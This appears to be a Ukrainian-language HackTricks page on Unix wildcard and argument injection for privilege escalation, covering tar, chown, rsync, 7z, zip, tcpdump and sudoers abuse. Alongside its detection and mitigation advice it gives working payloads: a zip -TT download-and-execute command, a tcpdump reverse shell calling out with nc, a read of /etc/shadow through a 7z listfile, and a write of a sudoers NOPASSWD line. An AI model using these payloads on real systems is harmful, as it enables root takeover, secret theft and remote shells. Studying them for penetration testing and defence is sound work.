# Додаткові трюки з Wildcards

{{#include ../../banners/hacktricks-training.md}}

> **Ін’єкція аргументів** через wildcard (також *glob*) відбувається, коли привілейований скрипт запускає бінарний файл Unix, як-от `tar`, `chown`, `rsync`, `zip`, `7z`, … з wildcard без лапок, наприклад `*`.  
> Оскільки shell розгортає wildcard **до** запуску бінарного файлу, зловмисник, який може створювати файли в робочому каталозі, може задати імена файлів, що починаються з `-`, щоб їх було інтерпретовано як **опції, а не дані**. Так можна непомітно передати довільні прапорці або навіть команди.<sup>[[6]](#references)</sup>  
> На цій сторінці зібрано найкорисніші примітиви, нещодавні дослідження та сучасні методи виявлення за 2023–2025 роки.

## chown / chmod

Ви можете **скопіювати власника/групу або біти дозволів із еталонного файлу**, зловживаючи прапорцем `--reference`, коли wildcard розгортається в ім’я файлу, схоже на опцію.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Коли root пізніше виконує щось на кшталт:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Розгорнутий параметр `--reference=.drf.php` перевизначає явно задані власника й режим, через що відповідні файли успадковують метадані `.drf.php` (а за наведеного вище налаштування стають доступними для запису зловмиснику).<sup>[[6]](#references)</sup>

Перевірте весь привілейований допоміжний скрипт, а не лише його рядок `chown`. Зміна власника може очистити біти set-user-ID або set-group-ID; [POSIX залишає поведінку в привілейованому випадку залежною від реалізації](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Пізніший `chmod` у тому самому завданні може відновити ці біти для файлів, вибраних раніше, і змінити результат. Перш ніж вважати це шляхом до підвищення привілеїв через виконуваний файл, перевірте фактичний порядок команд, каталог, доступний для запису, де розгортається glob, поведінку щодо відповідного файлу й посилань, кінцеві власника й режим, а також те, чи підтримує файлова система set-user-ID. Якщо допоміжний скрипт неможливо прочитати, ці кроки залишаються невідомими.

*PoC та інструмент*: [`wildpwn`](https://github.com/localh0t/wildpwn) (комбінована атака).<sup>[[7]](#references)</sup>
Див. також класичну статтю DefenseCode з докладним описом.<sup>[[6]](#references)</sup>

---

## GNU `cp` у привілейованому скрипті

Перевірте скрипт, який запускається від root і копіює файли з робочого каталогу, вибраного користувачем, використовуючи звичайний glob, наприклад `cp .version * /etc/app/staged/`, якщо користувач із нижчими привілеями може створювати там файли з довільними іменами. GNU `cp` може сприйняти ім’я файлу, що починається з дефіса й підставляється замість `*`, як параметр. Параметр `--preserve=mode` може зберегти біти режиму вихідного файлу під час створення копії, а `--target-directory` — змінити каталог призначення. Щоб підтвердити будь-який із цих ефектів, потрібно перевірити конкретну гілку скрипту, стан каталогу призначення, ефективні привілеї, політику файлової системи та поведінку GNU `cp`; сам текст правила sudo або скрипту не доводить можливість підвищення привілеїв. Додавання `./` перед операндами або завершення розбору параметрів за допомогою `--` запобігає такому трактуванню імен, що починаються з дефіса, у GNU `cp` ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [`cp` manual](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Виконуйте довільні команди, зловживаючи функцією **checkpoint** GNU tar та діями checkpoint.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Щойно root виконає, наприклад, `tar -czf /root/backup.tgz *`, `shell.sh` запуститься від імені root.<sup>[[10]](#references)</sup>

### Застереження щодо перевизначення компресора в bsdtar / macOS

У `tar` за замовчуванням у нових версіях macOS (на основі `libarchive`) немає інтерфейсу GNU tar `--checkpoint`, але в документації bsdtar описано **--use-compress-program** для вибору зовнішнього компресора.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Коли привілейований скрипт запускає `tar -cf backup.tar *`, через `PATH` він вибирає `sh`, а bsdtar запускає його як програму стиснення.<sup>[[11]](#references)</sup> Це доводить можливість ін’єкції параметрів, але саме по собі не є надійним способом виконання довільних команд: ім’я файлу, створене підстановкою шаблону, не може містити `/`, а bsdtar передає дані архіву, а не вибрану зловмисником команду для оболонки. Для виконання коду також потрібен виконуваний файл, який можна контролювати й який буде знайдено через `PATH`, або інший канал аргументів, що дає змогу вказати корисну програму.

---

## rsync

`rsync` дає змогу перевизначити віддалену оболонку або віддалений виконуваний файл за допомогою параметрів командного рядка, як-от `-e` і `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Якщо root пізніше заархівує каталог командою `rsync -az * backup:/srv/`, ін’єктований flag може запустити shell через механізм віддаленої оболонки.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (режим `rsync`).

---

## 7-Zip / 7z / 7za

Навіть якщо привілейований скрипт *для захисту* додає `--` перед шаблоном підстановки (щоб зупинити розбір опцій), CLI 7-Zip приймає **файли зі списками файлів**, якщо перед назвою файла поставити `@`. У поєднанні із symlink це дає змогу *викрасти довільні файли*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Якщо root виконує щось на кшталт:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip спробує прочитати `root.txt` (→ `/etc/shadow`) як список файлів і завершить роботу, **вивівши вміст у stderr**.<sup>[[13]](#references)</sup>

Це працює навіть із `-- *`, оскільки CLI 7-Zip явно приймає як звичайні імена файлів, так і `@listfiles` як позиційні аргументи, тож буквальне ім’я файлу, як-от `@root.txt`, усе одно обробляється особливим чином.<sup>[[13]](#references)</sup>

---

## zip

Коли програма передає керовані користувачем імена файлів у `zip` (через wildcard або перелічуючи імена без `--`), можна застосувати два дуже практичні примітиви.<sup>[[2]](#references)[[3]](#references)</sup>

- RCE через test hook: `-T` вмикає «перевірку архіву», а `-TT <cmd>` замінює програму-перевіряльник на довільну програму (повна форма: `--unzip-command <cmd>`). Якщо можна передавати імена файлів, що починаються з `-`, розділіть прапорці між окремими іменами файлів, щоб спрацював розбір коротких параметрів.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Примітки
- НЕ намагайтеся використати одне ім’я файлу на кшталт `'-T -TT <cmd>'` — короткі параметри розбираються посимвольно, тож це не спрацює. Використовуйте окремі токени, як показано.<sup>[[3]](#references)</sup>
- Якщо застосунок видаляє скісні риски з імен файлів, завантажте файл із хоста/IP без шляху (шлях за замовчуванням — `/index.html`) і збережіть його локально за допомогою `-O`, а потім виконайте.<sup>[[3]](#references)</sup>
- Щоб налагодити розбір, використовуйте `-sc` (показати оброблені argv) або `-h2` (докладніша довідка), щоб зрозуміти, як обробляються ваші токени.<sup>[[3]](#references)</sup>

Приклад (локальна поведінка у zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Витік даних/leak: Якщо вебрівень виводить stdout/stderr `zip` (поширене явище у наївних обгортках), інжектовані прапорці на кшталт `--help` або помилки через некоректні параметри з’являться у HTTP-відповіді, підтверджуючи ін’єкцію командного рядка та допомагаючи налаштувати payload.<sup>[[3]](#references)</sup>

---

## Додаткові кандидати для ін’єкції параметрів

Коли привілейована обгортка розгортає доступний для запису каталог за допомогою wildcard, варто перевірити ці задокументовані хуки параметрів.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Бінарний файл | Прапорець для зловживання | Ефект |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Передає командний рядок оболонці |
| `git`   | `-c core.sshCommand=<cmd>` | Використовує `<cmd>` замість SSH для Git fetch/push |
| `scp`   | `-S <program>` | Використовує альтернативну програму з підтримкою SSH для з’єднання |

Ці примітиви варто перевіряти на додачу до класичних *tar/rsync/zip*.

---

## Пошук вразливих обгорток і завдань

Нещодавні розбори випадків і рекомендації з виявлення показують, що ін’єкція wildcard/argv — це вже не лише проблема **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Цей самий клас помилок регулярно трапляється у:

- вебфункціях, що «завантажують усе як zip/tar» з каталогів завантажень, контрольованих зловмисником
- налагоджувальних оболонках від постачальників або для пристроїв, які надають обгортку **tcpdump** із полями імені файлу/фільтра, контрольованими зловмисником
- завданнях резервного копіювання або ротації, що запускають `tar`, `rsync`, `7z`, `zip`, `chown` або `chmod` для каталогів, доступних для запису

Корисні команди для первинного аналізу (виклик `pspy` використовує задокументовані прапорці для подій процесів/файлів та інтервалу).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Швидкі евристики:

- `-- *` — хороше рішення для багатьох інструментів GNU, але **не** для `7z`/`7za`, оскільки `@listfiles` обробляються окремо.<sup>[[13]](#references)</sup>
- Для `zip` шукайте обгортки, які напряму перелічують імена файлів, контрольовані користувачем; розділення коротких опцій (`-T` + `-TT <cmd>`) працює, навіть якщо glob оболонки не використовується.<sup>[[2]](#references)[[3]](#references)</sup>
- Для `tcpdump` звертайте особливу увагу на обгортки, які дають змогу контролювати **імена вихідних файлів**, **параметри ротації** або аргументи **повторного відтворення файлу захоплення**.<sup>[[18]](#references)</sup>

---

## Хуки ротації tcpdump (-G/-W/-z): RCE через argv injection в обгортках

Якщо обмежена оболонка або обгортка виробника формує командний рядок `tcpdump`, об’єднуючи контрольовані користувачем поля (наприклад, параметр «імені файлу») без належного екранування чи перевірки, можна непомітно додати зайві прапорці `tcpdump`. Комбінація `-G` (ротація за часом), `-W` (обмеження кількості файлів) і `-z <cmd>` (команда після ротації) дає змогу виконувати довільні команди від імені користувача, який запускає tcpdump (на пристроях це часто root).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Передумови:

- Ви можете впливати на `argv`, переданий `tcpdump` (наприклад, через обгортку на кшталт `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Обгортка не санітизує пробіли або токени в полі імені файлу, що починаються з `-`.<sup>[[4]](#references)</sup>

Класичний PoC (запускає reverse shell script із доступного для запису шляху).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Деталі:

- `-G 1` змінює файл кожну секунду, а `-W 1` зупиняє роботу після створення одного зміненого файлу; перед зміною файлу захоплення має отримати відповідний пакет.<sup>[[18]](#references)</sup>
- `-z <cmd>` запускає команду post-rotate один раз після кожної зміни файлу та передає шлях до закритого savefile як аргумент; переконайтеся, що обробка аргументів скриптом/інтерпретатором відповідає вашому payload.<sup>[[18]](#references)</sup>

Варіанти без знімних носіїв:

- Якщо у вас є інший примітив для запису файлів (наприклад, окрема обгортка команди, яка дозволяє перенаправлення виводу), помістіть скрипт у відомий шлях і запустіть його за допомогою `-z /path/script.sh`; за потреби скрипт має сам викликати `/bin/sh`.<sup>[[18]](#references)</sup>
- Якщо обгортка постачальника дозволяє вибрати шлях для зміненого файлу, перевіряйте керування цим шляхом лише в поєднанні з командою post-rotate, яка інтерпретує аргумент savefile; саме по собі керування шляхом не призводить до виконання вмісту файлу.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump з підстановними знаками/додатковими аргументами → довільний запис/читання та root

Приклад антипатерну sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Правило залишає кілька варіантів, доступних у задокументованому парсері tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob `*` і permissive patterns обмежують лише перший аргумент `-w`. `tcpdump` приймає кілька параметрів `-w`; діє останній.<sup>[[3]](#references)[[18]](#references)</sup>
- Правило не фіксує інші параметри, тож дозволені `-Z`, `-r`, `-V` тощо.<sup>[[3]](#references)[[18]](#references)</sup>

Нижче задокументовано відповідні примітиви.<sup>[[3]](#references)[[18]](#references)</sup>
- Перевизначення шляху призначення за допомогою другого `-w` (перший лише задовольняє sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal усередині першого -w, щоб вийти за межі обмеженого дерева.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Примусово встановіть власника вихідних файлів за допомогою `-Z root` (створює файли, що належать root, будь-де).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Запис довільного вмісту шляхом відтворення спеціально створеного PCAP через `-r` (наприклад, щоб додати рядок до sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Створіть PCAP із точним ASCII-вмістом і запишіть його від імені root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Читання довільних файлів/витік секретів за допомогою `-V <file>` (інтерпретує список файлів збереження). Діагностичні повідомлення про помилки часто відображають рядки, що призводить до витоку вмісту.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: ін'єкція аргументу zip для RCE + підвищення привілеїв через неправильне налаштування sudo для tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Повний ланцюжок експлуатації](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Виявлено потенційну оболонку через ін'єкцію шаблону підстановки](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Назад у майбутнє: шаблони підстановки Unix вийшли з-під контролю (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils — виклик `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils — виклик `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Контрольні точки GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Посібник bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Посібник rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Синтаксис командного рядка 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Посібник flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Документація з конфігурації Git](https://git-scm.com/docs/git-config)
- [17] [Посібник OpenBSD `scp`](https://man.openbsd.org/scp)
- [18] [Посібник tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
